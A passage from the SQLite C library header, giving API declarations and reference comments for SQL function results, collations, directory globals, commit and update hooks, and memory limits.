** These are special values for the destructor that is passed in as the
** final argument to routines like [sqlite3_result_blob()].  ^If the destructor
** argument is SQLITE_STATIC, it means that the content pointer is constant
** and will never change.  It does not need to be destroyed.  ^The
** SQLITE_TRANSIENT value means that the content will likely change in
** the near future and that SQLite should make its own private copy of
** the content before returning.
**
** The typedef is necessary to work around problems in certain
** C++ compilers.
*/
typedef void (*sqlite3_destructor_type)(void*);
#define SQLITE_STATIC      ((sqlite3_destructor_type)0)
#define SQLITE_TRANSIENT   ((sqlite3_destructor_type)-1)

/*
** CAPI3REF: Setting The Result Of An SQL Function
** METHOD: sqlite3_context
**
** These routines are used by the xFunc or xFinal callbacks that
** implement SQL functions and aggregates.  See
** [sqlite3_create_function()] and [sqlite3_create_function16()]
** for additional information.
**
** These functions work very much like the [parameter binding] family of
** functions used to bind values to host parameters in prepared statements.
** Refer to the [SQL parameter] documentation for additional information.
**
** ^The sqlite3_result_blob() interface sets the result from
** an application-defined function to be the BLOB whose content is pointed
** to by the second parameter and which is N bytes long where N is the
** third parameter.
**
** ^The sqlite3_result_zeroblob(C,N) and sqlite3_result_zeroblob64(C,N)
** interfaces set the result of the application-defined function to be
** a BLOB containing all zero bytes and N bytes in size.
**
** ^The sqlite3_result_double() interface sets the result from
** an application-defined function to be a floating point value specified
** by its 2nd argument.
**
** ^The sqlite3_result_error() and sqlite3_result_error16() functions
** cause the implemented SQL function to throw an exception.
** ^SQLite uses the string pointed to by the
** 2nd parameter of sqlite3_result_error() or sqlite3_result_error16()
** as the text of an error message.  ^SQLite interprets the error
** message string from sqlite3_result_error() as UTF-8. ^SQLite
** interprets the string from sqlite3_result_error16() as UTF-16 in native
** byte order.  ^If the third parameter to sqlite3_result_error()
** or sqlite3_result_error16() is negative then SQLite takes as the error
** message all text up through the first zero character.
** ^If the third parameter to sqlite3_result_error() or
** sqlite3_result_error16() is non-negative then SQLite takes that many
** bytes (not characters) from the 2nd parameter as the error message.
** ^The sqlite3_result_error() and sqlite3_result_error16()
** routines make a private copy of the error message text before
** they return.  Hence, the calling function can deallocate or
** modify the text after they return without harm.
** ^The sqlite3_result_error_code() function changes the error code
** returned by SQLite as a result of an error in a function.  ^By default,
** the error code is SQLITE_ERROR.  ^A subsequent call to sqlite3_result_error()
** or sqlite3_result_error16() resets the error code to SQLITE_ERROR.
**
** ^The sqlite3_result_error_toobig() interface causes SQLite to throw an
** error indicating that a string or BLOB is too long to represent.
**
** ^The sqlite3_result_error_nomem() interface causes SQLite to throw an
** error indicating that a memory allocation failed.
**
** ^The sqlite3_result_int() interface sets the return value
** of the application-defined function to be the 32-bit signed integer
** value given in the 2nd argument.
** ^The sqlite3_result_int64() interface sets the return value
** of the application-defined function to be the 64-bit signed integer
** value given in the 2nd argument.
**
** ^The sqlite3_result_null() interface sets the return value
** of the application-defined function to be NULL.
**
** ^The sqlite3_result_text(), sqlite3_result_text16(),
** sqlite3_result_text16le(), and sqlite3_result_text16be() interfaces
** set the return value of the application-defined function to be
** a text string which is represented as UTF-8, UTF-16 native byte order,
** UTF-16 little endian, or UTF-16 big endian, respectively.
** ^The sqlite3_result_text64() interface sets the return value of an
** application-defined function to be a text string in an encoding
** specified by the fifth (and last) parameter, which must be one
** of [SQLITE_UTF8], [SQLITE_UTF16], [SQLITE_UTF16BE], or [SQLITE_UTF16LE].
** ^SQLite takes the text result from the application from
** the 2nd parameter of the sqlite3_result_text* interfaces.
** ^If the 3rd parameter to the sqlite3_result_text* interfaces
** is negative, then SQLite takes result text from the 2nd parameter
** through the first zero character.
** ^If the 3rd parameter to the sqlite3_result_text* interfaces
** is non-negative, then as many bytes (not characters) of the text
** pointed to by the 2nd parameter are taken as the application-defined
** function result.  If the 3rd parameter is non-negative, then it
** must be the byte offset into the string where the NUL terminator would
** appear if the string where NUL terminated.  If any NUL characters occur
** in the string at a byte offset that is less than the value of the 3rd
** parameter, then the resulting string will contain embedded NULs and the
** result of expressions operating on strings with embedded NULs is undefined.
** ^If the 4th parameter to the sqlite3_result_text* interfaces
** or sqlite3_result_blob is a non-NULL pointer, then SQLite calls that
** function as the destructor on the text or BLOB result when it has
** finished using that result.
** ^If the 4th parameter to the sqlite3_result_text* interfaces or to
** sqlite3_result_blob is the special constant SQLITE_STATIC, then SQLite
** assumes that the text or BLOB result is in constant space and does not
** copy the content of the parameter nor call a destructor on the content
** when it has finished using that result.
** ^If the 4th parameter to the sqlite3_result_text* interfaces
** or sqlite3_result_blob is the special constant SQLITE_TRANSIENT
** then SQLite makes a copy of the result into space obtained
** from [sqlite3_malloc()] before it returns.
**
** ^The sqlite3_result_value() interface sets the result of
** the application-defined function to be a copy of the
** [unprotected sqlite3_value] object specified by the 2nd parameter.  ^The
** sqlite3_result_value() interface makes a copy of the [sqlite3_value]
** so that the [sqlite3_value] specified in the parameter may change or
** be deallocated after sqlite3_result_value() returns without harm.
** ^A [protected sqlite3_value] object may always be used where an
** [unprotected sqlite3_value] object is required, so either
** kind of [sqlite3_value] object can be used with this interface.
**
** ^The sqlite3_result_pointer(C,P,T,D) interface sets the result to an
** SQL NULL value, just like [sqlite3_result_null(C)], except that it
** also associates the host-language pointer P or type T with that 
** NULL value such that the pointer can be retrieved within an
** [application-defined SQL function] using [sqlite3_value_pointer()].
** ^If the D parameter is not NULL, then it is a pointer to a destructor
** for the P parameter.  ^SQLite invokes D with P as its only argument
** when SQLite is finished with P.  The T parameter should be a static
** string and preferably a string literal. The sqlite3_result_pointer()
** routine is part of the [pointer passing interface] added for SQLite 3.20.0.
**
** If these routines are called from within the different thread
** than the one containing the application-defined function that received
** the [sqlite3_context] pointer, the results are undefined.
*/
SQLITE_API void sqlite3_result_blob(sqlite3_context*, const void*, int, void(*)(void*));
SQLITE_API void sqlite3_result_blob64(sqlite3_context*,const void*,
                           sqlite3_uint64,void(*)(void*));
SQLITE_API void sqlite3_result_double(sqlite3_context*, double);
SQLITE_API void sqlite3_result_error(sqlite3_context*, const char*, int);
SQLITE_API void sqlite3_result_error16(sqlite3_context*, const void*, int);
SQLITE_API void sqlite3_result_error_toobig(sqlite3_context*);
SQLITE_API void sqlite3_result_error_nomem(sqlite3_context*);
SQLITE_API void sqlite3_result_error_code(sqlite3_context*, int);
SQLITE_API void sqlite3_result_int(sqlite3_context*, int);
SQLITE_API void sqlite3_result_int64(sqlite3_context*, sqlite3_int64);
SQLITE_API void sqlite3_result_null(sqlite3_context*);
SQLITE_API void sqlite3_result_text(sqlite3_context*, const char*, int, void(*)(void*));
SQLITE_API void sqlite3_result_text64(sqlite3_context*, const char*,sqlite3_uint64,
                           void(*)(void*), unsigned char encoding);
SQLITE_API void sqlite3_result_text16(sqlite3_context*, const void*, int, void(*)(void*));
SQLITE_API void sqlite3_result_text16le(sqlite3_context*, const void*, int,void(*)(void*));
SQLITE_API void sqlite3_result_text16be(sqlite3_context*, const void*, int,void(*)(void*));
SQLITE_API void sqlite3_result_value(sqlite3_context*, sqlite3_value*);
SQLITE_API void sqlite3_result_pointer(sqlite3_context*, void*,const char*,void(*)(void*));
SQLITE_API void sqlite3_result_zeroblob(sqlite3_context*, int n);
SQLITE_API int sqlite3_result_zeroblob64(sqlite3_context*, sqlite3_uint64 n);


/*
** CAPI3REF: Setting The Subtype Of An SQL Function
** METHOD: sqlite3_context
**
** The sqlite3_result_subtype(C,T) function causes the subtype of
** the result from the [application-defined SQL function] with 
** [sqlite3_context] C to be the value T.  Only the lower 8 bits 
** of the subtype T are preserved in current versions of SQLite;
** higher order bits are discarded.
** The number of subtype bytes preserved by SQLite might increase
** in future releases of SQLite.
*/
SQLITE_API void sqlite3_result_subtype(sqlite3_context*,unsigned int);

/*
** CAPI3REF: Define New Collating Sequences
** METHOD: sqlite3
**
** ^These functions add, remove, or modify a [collation] associated
** with the [database connection] specified as the first argument.
**
** ^The name of the collation is a UTF-8 string
** for sqlite3_create_collation() and sqlite3_create_collation_v2()
** and a UTF-16 string in native byte order for sqlite3_create_collation16().
** ^Collation names that compare equal according to [sqlite3_strnicmp()] are
** considered to be the same name.
**
** ^(The third argument (eTextRep) must be one of the constants:
** <ul>
** <li> [SQLITE_UTF8],
** <li> [SQLITE_UTF16LE],
** <li> [SQLITE_UTF16BE],
** <li> [SQLITE_UTF16], or
** <li> [SQLITE_UTF16_ALIGNED].
** </ul>)^
** ^The eTextRep argument determines the encoding of strings passed
** to the collating function callback, xCallback.
** ^The [SQLITE_UTF16] and [SQLITE_UTF16_ALIGNED] values for eTextRep
** force strings to be UTF16 with native byte order.
** ^The [SQLITE_UTF16_ALIGNED] value for eTextRep forces strings to begin
** on an even byte address.
**
** ^The fourth argument, pArg, is an application data pointer that is passed
** through as the first argument to the collating function callback.
**
** ^The fifth argument, xCallback, is a pointer to the collating function.
** ^Multiple collating functions can be registered using the same name but
** with different eTextRep parameters and SQLite will use whichever
** function requires the least amount of data transformation.
** ^If the xCallback argument is NULL then the collating function is
** deleted.  ^When all collating functions having the same name are deleted,
** that collation is no longer usable.
**
** ^The collating function callback is invoked with a copy of the pArg 
** application data pointer and with two strings in the encoding specified
** by the eTextRep argument.  The collating function must return an
** integer that is negative, zero, or positive
** if the first string is less than, equal to, or greater than the second,
** respectively.  A collating function must always return the same answer
** given the same inputs.  If two or more collating functions are registered
** to the same collation name (using different eTextRep values) then all
** must give an equivalent answer when invoked with equivalent strings.
** The collating function must obey the following properties for all
** strings A, B, and C:
**
** <ol>
** <li> If A==B then B==A.
** <li> If A==B and B==C then A==C.
** <li> If A&lt;B THEN B&gt;A.
** <li> If A&lt;B and B&lt;C then A&lt;C.
** </ol>
**
** If a collating function fails any of the above constraints and that
** collating function is  registered and used, then the behavior of SQLite
** is undefined.
**
** ^The sqlite3_create_collation_v2() works like sqlite3_create_collation()
** with the addition that the xDestroy callback is invoked on pArg when
** the collating function is deleted.
** ^Collating functions are deleted when they are overridden by later
** calls to the collation creation functions or when the
** [database connection] is closed using [sqlite3_close()].
**
** ^The xDestroy callback is <u>not</u> called if the 
** sqlite3_create_collation_v2() function fails.  Applications that invoke
** sqlite3_create_collation_v2() with a non-NULL xDestroy argument should 
** check the return code and dispose of the application data pointer
** themselves rather than expecting SQLite to deal with it for them.
** This is different from every other SQLite interface.  The inconsistency 
** is unfortunate but cannot be changed without breaking backwards 
** compatibility.
**
** See also:  [sqlite3_collation_needed()] and [sqlite3_collation_needed16()].
*/
SQLITE_API int sqlite3_create_collation(
  sqlite3*, 
  const char *zName, 
  int eTextRep, 
  void *pArg,
  int(*xCompare)(void*,int,const void*,int,const void*)
);
SQLITE_API int sqlite3_create_collation_v2(
  sqlite3*, 
  const char *zName, 
  int eTextRep, 
  void *pArg,
  int(*xCompare)(void*,int,const void*,int,const void*),
  void(*xDestroy)(void*)
);
SQLITE_API int sqlite3_create_collation16(
  sqlite3*, 
  const void *zName,
  int eTextRep, 
  void *pArg,
  int(*xCompare)(void*,int,const void*,int,const void*)
);

/*
** CAPI3REF: Collation Needed Callbacks
** METHOD: sqlite3
**
** ^To avoid having to register all collation sequences before a database
** can be used, a single callback function may be registered with the
** [database connection] to be invoked whenever an undefined collation
** sequence is required.
**
** ^If the function is registered using the sqlite3_collation_needed() API,
** then it is passed the names of undefined collation sequences as strings
** encoded in UTF-8. ^If sqlite3_collation_needed16() is used,
** the names are passed as UTF-16 in machine native byte order.
** ^A call to either function replaces the existing collation-needed callback.
**
** ^(When the callback is invoked, the first argument passed is a copy
** of the second argument to sqlite3_collation_needed() or
** sqlite3_collation_needed16().  The second argument is the database
** connection.  The third argument is one of [SQLITE_UTF8], [SQLITE_UTF16BE],
** or [SQLITE_UTF16LE], indicating the most desirable form of the collation
** sequence function required.  The fourth parameter is the name of the
** required collation sequence.)^
**
** The callback function should register the desired collation using
** [sqlite3_create_collation()], [sqlite3_create_collation16()], or
** [sqlite3_create_collation_v2()].
*/
SQLITE_API int sqlite3_collation_needed(
  sqlite3*, 
  void*, 
  void(*)(void*,sqlite3*,int eTextRep,const char*)
);
SQLITE_API int sqlite3_collation_needed16(
  sqlite3*, 
  void*,
  void(*)(void*,sqlite3*,int eTextRep,const void*)
);

#ifdef SQLITE_HAS_CODEC
/*
** Specify the key for an encrypted database.  This routine should be
** called right after sqlite3_open().
**
** The code to implement this API is not available in the public release
** of SQLite.
*/
SQLITE_API int sqlite3_key(
  sqlite3 *db,                   /* Database to be rekeyed */
  const void *pKey, int nKey     /* The key */
);
SQLITE_API int sqlite3_key_v2(
  sqlite3 *db,                   /* Database to be rekeyed */
  const char *zDbName,           /* Name of the database */
  const void *pKey, int nKey     /* The key */
);

/*
** Change the key on an open database.  If the current database is not
** encrypted, this routine will encrypt it.  If pNew==0 or nNew==0, the
** database is decrypted.
**
** The code to implement this API is not available in the public release
** of SQLite.
*/
SQLITE_API int sqlite3_rekey(
  sqlite3 *db,                   /* Database to be rekeyed */
  const void *pKey, int nKey     /* The new key */
);
SQLITE_API int sqlite3_rekey_v2(
  sqlite3 *db,                   /* Database to be rekeyed */
  const char *zDbName,           /* Name of the database */
  const void *pKey, int nKey     /* The new key */
);

/*
** Specify the activation key for a SEE database.  Unless 
** activated, none of the SEE routines will work.
*/
SQLITE_API void sqlite3_activate_see(
  const char *zPassPhrase        /* Activation phrase */
);
#endif

#ifdef SQLITE_ENABLE_CEROD
/*
** Specify the activation key for a CEROD database.  Unless 
** activated, none of the CEROD routines will work.
*/
SQLITE_API void sqlite3_activate_cerod(
  const char *zPassPhrase        /* Activation phrase */
);
#endif

/*
** CAPI3REF: Suspend Execution For A Short Time
**
** The sqlite3_sleep() function causes the current thread to suspend execution
** for at least a number of milliseconds specified in its parameter.
**
** If the operating system does not support sleep requests with
** millisecond time resolution, then the time will be rounded up to
** the nearest second. The number of milliseconds of sleep actually
** requested from the operating system is returned.
**
** ^SQLite implements this interface by calling the xSleep()
** method of the default [sqlite3_vfs] object.  If the xSleep() method
** of the default VFS is not implemented correctly, or not implemented at
** all, then the behavior of sqlite3_sleep() may deviate from the description
** in the previous paragraphs.
*/
SQLITE_API int sqlite3_sleep(int);

/*
** CAPI3REF: Name Of The Folder Holding Temporary Files
**
** ^(If this global variable is made to point to a string which is
** the name of a folder (a.k.a. directory), then all temporary files
** created by SQLite when using a built-in [sqlite3_vfs | VFS]
** will be placed in that directory.)^  ^If this variable
** is a NULL pointer, then SQLite performs a search for an appropriate
** temporary file directory.
**
** Applications are strongly discouraged from using this global variable.
** It is required to set a temporary folder on Windows Runtime (WinRT).
** But for all other platforms, it is highly recommended that applications
** neither read nor write this variable.  This global variable is a relic
** that exists for backwards compatibility of legacy applications and should
** be avoided in new projects.
**
** It is not safe to read or modify this variable in more than one
** thread at a time.  It is not safe to read or modify this variable
** if a [database connection] is being used at the same time in a separate
** thread.
** It is intended that this variable be set once
** as part of process initialization and before any SQLite interface
** routines have been called and that this variable remain unchanged
** thereafter.
**
** ^The [temp_store_directory pragma] may modify this variable and cause
** it to point to memory obtained from [sqlite3_malloc].  ^Furthermore,
** the [temp_store_directory pragma] always assumes that any string
** that this variable points to is held in memory obtained from 
** [sqlite3_malloc] and the pragma may attempt to free that memory
** using [sqlite3_free].
** Hence, if this variable is modified directly, either it should be
** made NULL or made to point to memory obtained from [sqlite3_malloc]
** or else the use of the [temp_store_directory pragma] should be avoided.
** Except when requested by the [temp_store_directory pragma], SQLite
** does not free the memory that sqlite3_temp_directory points to.  If
** the application wants that memory to be freed, it must do
** so itself, taking care to only do so after all [database connection]
** objects have been destroyed.
**
** <b>Note to Windows Runtime users:</b>  The temporary directory must be set
** prior to calling [sqlite3_open] or [sqlite3_open_v2].  Otherwise, various
** features that require the use of temporary files may fail.  Here is an
** example of how to do this using C++ with the Windows Runtime:
**
** <blockquote><pre>
** LPCWSTR zPath = Windows::Storage::ApplicationData::Current->
** &nbsp;     TemporaryFolder->Path->Data();
** char zPathBuf&#91;MAX_PATH + 1&#93;;
** memset(zPathBuf, 0, sizeof(zPathBuf));
** WideCharToMultiByte(CP_UTF8, 0, zPath, -1, zPathBuf, sizeof(zPathBuf),
** &nbsp;     NULL, NULL);
** sqlite3_temp_directory = sqlite3_mprintf("%s", zPathBuf);
** </pre></blockquote>
*/
SQLITE_API SQLITE_EXTERN char *sqlite3_temp_directory;

/*
** CAPI3REF: Name Of The Folder Holding Database Files
**
** ^(If this global variable is made to point to a string which is
** the name of a folder (a.k.a. directory), then all database files
** specified with a relative pathname and created or accessed by
** SQLite when using a built-in windows [sqlite3_vfs | VFS] will be assumed
** to be relative to that directory.)^ ^If this variable is a NULL
** pointer, then SQLite assumes that all database files specified
** with a relative pathname are relative to the current directory
** for the process.  Only the windows VFS makes use of this global
** variable; it is ignored by the unix VFS.
**
** Changing the value of this variable while a database connection is
** open can result in a corrupt database.
**
** It is not safe to read or modify this variable in more than one
** thread at a time.  It is not safe to read or modify this variable
** if a [database connection] is being used at the same time in a separate
** thread.
** It is intended that this variable be set once
** as part of process initialization and before any SQLite interface
** routines have been called and that this variable remain unchanged
** thereafter.
**
** ^The [data_store_directory pragma] may modify this variable and cause
** it to point to memory obtained from [sqlite3_malloc].  ^Furthermore,
** the [data_store_directory pragma] always assumes that any string
** that this variable points to is held in memory obtained from 
** [sqlite3_malloc] and the pragma may attempt to free that memory
** using [sqlite3_free].
** Hence, if this variable is modified directly, either it should be
** made NULL or made to point to memory obtained from [sqlite3_malloc]
** or else the use of the [data_store_directory pragma] should be avoided.
*/
SQLITE_API SQLITE_EXTERN char *sqlite3_data_directory;

/*
** CAPI3REF: Win32 Specific Interface
**
** These interfaces are available only on Windows.  The
** [sqlite3_win32_set_directory] interface is used to set the value associated
** with the [sqlite3_temp_directory] or [sqlite3_data_directory] variable, to
** zValue, depending on the value of the type parameter.  The zValue parameter
** should be NULL to cause the previous value to be freed via [sqlite3_free];
** a non-NULL value will be copied into memory obtained from [sqlite3_malloc]
** prior to being used.  The [sqlite3_win32_set_directory] interface returns
** [SQLITE_OK] to indicate success, [SQLITE_ERROR] if the type is unsupported,
** or [SQLITE_NOMEM] if memory could not be allocated.  The value of the
** [sqlite3_data_directory] variable is intended to act as a replacement for
** the current directory on the sub-platforms of Win32 where that concept is
** not present, e.g. WinRT and UWP.  The [sqlite3_win32_set_directory8] and
** [sqlite3_win32_set_directory16] interfaces behave exactly the same as the
** sqlite3_win32_set_directory interface except the string parameter must be
** UTF-8 or UTF-16, respectively.
*/
SQLITE_API int sqlite3_win32_set_directory(
  unsigned long type, /* Identifier for directory being set or reset */
  void *zValue        /* New value for directory being set or reset */
);
SQLITE_API int sqlite3_win32_set_directory8(unsigned long type, const char *zValue);
SQLITE_API int sqlite3_win32_set_directory16(unsigned long type, const void *zValue);

/*
** CAPI3REF: Win32 Directory Types
**
** These macros are only available on Windows.  They define the allowed values
** for the type argument to the [sqlite3_win32_set_directory] interface.
*/
#define SQLITE_WIN32_DATA_DIRECTORY_TYPE  1
#define SQLITE_WIN32_TEMP_DIRECTORY_TYPE  2

/*
** CAPI3REF: Test For Auto-Commit Mode
** KEYWORDS: {autocommit mode}
** METHOD: sqlite3
**
** ^The sqlite3_get_autocommit() interface returns non-zero or
** zero if the given database connection is or is not in autocommit mode,
** respectively.  ^Autocommit mode is on by default.
** ^Autocommit mode is disabled by a [BEGIN] statement.
** ^Autocommit mode is re-enabled by a [COMMIT] or [ROLLBACK].
**
** If certain kinds of errors occur on a statement within a multi-statement
** transaction (errors including [SQLITE_FULL], [SQLITE_IOERR],
** [SQLITE_NOMEM], [SQLITE_BUSY], and [SQLITE_INTERRUPT]) then the
** transaction might be rolled back automatically.  The only way to
** find out whether SQLite automatically rolled back the transaction after
** an error is to use this function.
**
** If another thread changes the autocommit status of the database
** connection while this routine is running, then the return value
** is undefined.
*/
SQLITE_API int sqlite3_get_autocommit(sqlite3*);

/*
** CAPI3REF: Find The Database Handle Of A Prepared Statement
** METHOD: sqlite3_stmt
**
** ^The sqlite3_db_handle interface returns the [database connection] handle
** to which a [prepared statement] belongs.  ^The [database connection]
** returned by sqlite3_db_handle is the same [database connection]
** that was the first argument
** to the [sqlite3_prepare_v2()] call (or its variants) that was used to
** create the statement in the first place.
*/
SQLITE_API sqlite3 *sqlite3_db_handle(sqlite3_stmt*);

/*
** CAPI3REF: Return The Filename For A Database Connection
** METHOD: sqlite3
**
** ^The sqlite3_db_filename(D,N) interface returns a pointer to a filename
** associated with database N of connection D.  ^The main database file
** has the name "main".  If there is no attached database N on the database
** connection D, or if database N is a temporary or in-memory database, then
** this function will return either a NULL pointer or an empty string.
**
** ^The filename returned by this function is the output of the
** xFullPathname method of the [VFS].  ^In other words, the filename
** will be an absolute pathname, even if the filename used
** to open the database originally was a URI or relative pathname.
*/
SQLITE_API const char *sqlite3_db_filename(sqlite3 *db, const char *zDbName);

/*
** CAPI3REF: Determine if a database is read-only
** METHOD: sqlite3
**
** ^The sqlite3_db_readonly(D,N) interface returns 1 if the database N
** of connection D is read-only, 0 if it is read/write, or -1 if N is not
** the name of a database on connection D.
*/
SQLITE_API int sqlite3_db_readonly(sqlite3 *db, const char *zDbName);

/*
** CAPI3REF: Find the next prepared statement
** METHOD: sqlite3
**
** ^This interface returns a pointer to the next [prepared statement] after
** pStmt associated with the [database connection] pDb.  ^If pStmt is NULL
** then this interface returns a pointer to the first prepared statement
** associated with the database connection pDb.  ^If no prepared statement
** satisfies the conditions of this routine, it returns NULL.
**
** The [database connection] pointer D in a call to
** [sqlite3_next_stmt(D,S)] must refer to an open database
** connection and in particular must not be a NULL pointer.
*/
SQLITE_API sqlite3_stmt *sqlite3_next_stmt(sqlite3 *pDb, sqlite3_stmt *pStmt);

/*
** CAPI3REF: Commit And Rollback Notification Callbacks
** METHOD: sqlite3
**
** ^The sqlite3_commit_hook() interface registers a callback
** function to be invoked whenever a transaction is [COMMIT | committed].
** ^Any callback set by a previous call to sqlite3_commit_hook()
** for the same database connection is overridden.
** ^The sqlite3_rollback_hook() interface registers a callback
** function to be invoked whenever a transaction is [ROLLBACK | rolled back].
** ^Any callback set by a previous call to sqlite3_rollback_hook()
** for the same database connection is overridden.
** ^The pArg argument is passed through to the callback.
** ^If the callback on a commit hook function returns non-zero,
** then the commit is converted into a rollback.
**
** ^The sqlite3_commit_hook(D,C,P) and sqlite3_rollback_hook(D,C,P) functions
** return the P argument from the previous call of the same function
** on the same [database connection] D, or NULL for
** the first call for each function on D.
**
** The commit and rollback hook callbacks are not reentrant.
** The callback implementation must not do anything that will modify
** the database connection that invoked the callback.  Any actions
** to modify the database connection must be deferred until after the
** completion of the [sqlite3_step()] call that triggered the commit
** or rollback hook in the first place.
** Note that running any other SQL statements, including SELECT statements,
** or merely calling [sqlite3_prepare_v2()] and [sqlite3_step()] will modify
** the database connections for the meaning of "modify" in this paragraph.
**
** ^Registering a NULL function disables the callback.
**
** ^When the commit hook callback routine returns zero, the [COMMIT]
** operation is allowed to continue normally.  ^If the commit hook
** returns non-zero, then the [COMMIT] is converted into a [ROLLBACK].
** ^The rollback hook is invoked on a rollback that results from a commit
** hook returning non-zero, just as it would be with any other rollback.
**
** ^For the purposes of this API, a transaction is said to have been
** rolled back if an explicit "ROLLBACK" statement is executed, or
** an error or constraint causes an implicit rollback to occur.
** ^The rollback callback is not invoked if a transaction is
** automatically rolled back because the database connection is closed.
**
** See also the [sqlite3_update_hook()] interface.
*/
SQLITE_API void *sqlite3_commit_hook(sqlite3*, int(*)(void*), void*);
SQLITE_API void *sqlite3_rollback_hook(sqlite3*, void(*)(void *), void*);

/*
** CAPI3REF: Data Change Notification Callbacks
** METHOD: sqlite3
**
** ^The sqlite3_update_hook() interface registers a callback function
** with the [database connection] identified by the first argument
** to be invoked whenever a row is updated, inserted or deleted in
** a [rowid table].
** ^Any callback set by a previous call to this function
** for the same database connection is overridden.
**
** ^The second argument is a pointer to the function to invoke when a
** row is updated, inserted or deleted in a rowid table.
** ^The first argument to the callback is a copy of the third argument
** to sqlite3_update_hook().
** ^The second callback argument is one of [SQLITE_INSERT], [SQLITE_DELETE],
** or [SQLITE_UPDATE], depending on the operation that caused the callback
** to be invoked.
** ^The third and fourth arguments to the callback contain pointers to the
** database and table name containing the affected row.
** ^The final callback parameter is the [rowid] of the row.
** ^In the case of an update, this is the [rowid] after the update takes place.
**
** ^(The update hook is not invoked when internal system tables are
** modified (i.e. sqlite_master and sqlite_sequence).)^
** ^The update hook is not invoked when [WITHOUT ROWID] tables are modified.
**
** ^In the current implementation, the update hook
** is not invoked when conflicting rows are deleted because of an
** [ON CONFLICT | ON CONFLICT REPLACE] clause.  ^Nor is the update hook
** invoked when rows are deleted using the [truncate optimization].
** The exceptions defined in this paragraph might change in a future
** release of SQLite.
**
** The update hook implementation must not do anything that will modify
** the database connection that invoked the update hook.  Any actions
** to modify the database connection must be deferred until after the
** completion of the [sqlite3_step()] call that triggered the update hook.
** Note that [sqlite3_prepare_v2()] and [sqlite3_step()] both modify their
** database connections for the meaning of "modify" in this paragraph.
**
** ^The sqlite3_update_hook(D,C,P) function
** returns the P argument from the previous call
** on the same [database connection] D, or NULL for
** the first call on D.
**
** See also the [sqlite3_commit_hook()], [sqlite3_rollback_hook()],
** and [sqlite3_preupdate_hook()] interfaces.
*/
SQLITE_API void *sqlite3_update_hook(
  sqlite3*, 
  void(*)(void *,int ,char const *,char const *,sqlite3_int64),
  void*
);

/*
** CAPI3REF: Enable Or Disable Shared Pager Cache
**
** ^(This routine enables or disables the sharing of the database cache
** and schema data structures between [database connection | connections]
** to the same database. Sharing is enabled if the argument is true
** and disabled if the argument is false.)^
**
** ^Cache sharing is enabled and disabled for an entire process.
** This is a change as of SQLite [version 3.5.0] ([dateof:3.5.0]). 
** In prior versions of SQLite,
** sharing was enabled or disabled for each thread separately.
**
** ^(The cache sharing mode set by this interface effects all subsequent
** calls to [sqlite3_open()], [sqlite3_open_v2()], and [sqlite3_open16()].
** Existing database connections continue use the sharing mode
** that was in effect at the time they were opened.)^
**
** ^(This routine returns [SQLITE_OK] if shared cache was enabled or disabled
** successfully.  An [error code] is returned otherwise.)^
**
** ^Shared cache is disabled by default. But this might change in
** future releases of SQLite.  Applications that care about shared
** cache setting should set it explicitly.
**
** Note: This method is disabled on MacOS X 10.7 and iOS version 5.0
** and will always return SQLITE_MISUSE. On those systems, 
** shared cache mode should be enabled per-database connection via 
** [sqlite3_open_v2()] with [SQLITE_OPEN_SHAREDCACHE].
**
** This interface is threadsafe on processors where writing a
** 32-bit integer is atomic.
**
** See Also:  [SQLite Shared-Cache Mode]
*/
SQLITE_API int sqlite3_enable_shared_cache(int);

/*
** CAPI3REF: Attempt To Free Heap Memory
**
** ^The sqlite3_release_memory() interface attempts to free N bytes
** of heap memory by deallocating non-essential memory allocations
** held by the database library.   Memory used to cache database
** pages to improve performance is an example of non-essential memory.
** ^sqlite3_release_memory() returns the number of bytes actually freed,
** which might be more or less than the amount requested.
** ^The sqlite3_release_memory() routine is a no-op returning zero
** if SQLite is not compiled with [SQLITE_ENABLE_MEMORY_MANAGEMENT].
**
** See also: [sqlite3_db_release_memory()]
*/
SQLITE_API int sqlite3_release_memory(int);

/*
** CAPI3REF: Free Memory Used By A Database Connection
** METHOD: sqlite3
**
** ^The sqlite3_db_release_memory(D) interface attempts to free as much heap
** memory as possible from database connection D. Unlike the
** [sqlite3_release_memory()] interface, this interface is in effect even
** when the [SQLITE_ENABLE_MEMORY_MANAGEMENT] compile-time option is
** omitted.
**
** See also: [sqlite3_release_memory()]
*/
SQLITE_API int sqlite3_db_release_memory(sqlite3*);

/*
** CAPI3REF: Impose A Limit On Heap Size
**
** ^The sqlite3_soft_heap_limit64() interface sets and/or queries the
** soft limit on the amount of heap memory that may be allocated by SQLite.
** ^SQLite strives to keep heap memory utilization below the soft heap
** limit by reducing the number of pages held in the page cache
** as heap memory usages approaches the limit.
** ^The soft heap limit is "soft" because even though SQLite strives to stay
** below the limit, it will exceed the limit rather than generate
** an [SQLITE_NOMEM] error.  In other words, the soft heap limit 
** is advisory only.
**
** ^The return value from sqlite3_soft_heap_limit64() is the size of
** the soft heap limit prior to the call, or negative in the case of an
** error.  ^If the argument N is negative
** then no change is made to the soft heap limit.  Hence, the current
** size of the soft heap limit can be determined by invoking
** sqlite3_soft_heap_limit64() with a negative argument.
**
** ^If the argument N is zero then the soft heap limit is disabled.
**
** ^(The soft heap limit is not enforced in the current implementation
** if one or more of following conditions are true:
**
** <ul>
** <li> The soft heap limit is set to zero.
** <li> Memory accounting is disabled using a combination of the
**      [sqlite3_config]([SQLITE_CONFIG_MEMSTATUS],...) start-time option and
**      the [SQLITE_DEFAULT_MEMSTATUS] compile-time option.
** <li> An alternative page cache implementation is specified using
**      [sqlite3_config]([SQLITE_CONFIG_PCACHE2],...).
** <li> The page cache allocates from its own memory pool supplied
**      by [sqlite3_config]([SQLITE_CONFIG_PAGECACHE],...) rather than
**      from the heap.
** </ul>)^
**
** Beginning with SQLite [version 3.7.3] ([dateof:3.7.3]), 
** the soft heap limit is enforced
** regardless of whether or not the [SQLITE_ENABLE_MEMORY_MANAGEMENT]
** compile-time option is invoked.  With [SQLITE_ENABLE_MEMORY_MANAGEMENT],
** the soft heap limit is enforced on every memory allocation.  Without
** [SQLITE_ENABLE_MEMORY_MANAGEMENT], the soft heap limit is only enforced
** when memory is allocated by the page cache.  Testing suggests that because
** the page cache is the predominate memory user in SQLite, most
** applications will achieve adequate soft heap limit enforcement without
** the use of [SQLITE_ENABLE_MEMORY_MANAGEMENT].
**
** The circumstances under which SQLite will enforce the soft heap limit may
** changes in future releases of SQLite.
*/
SQLITE_API sqlite3_int64 sqlite3_soft_heap_limit64(sqlite3_int64 N);

/*
** CAPI3REF: Deprecated Soft Heap Limit Interface
** DEPRECATED
**
** This is a deprecated version of the [sqlite3_soft_heap_limit64()]
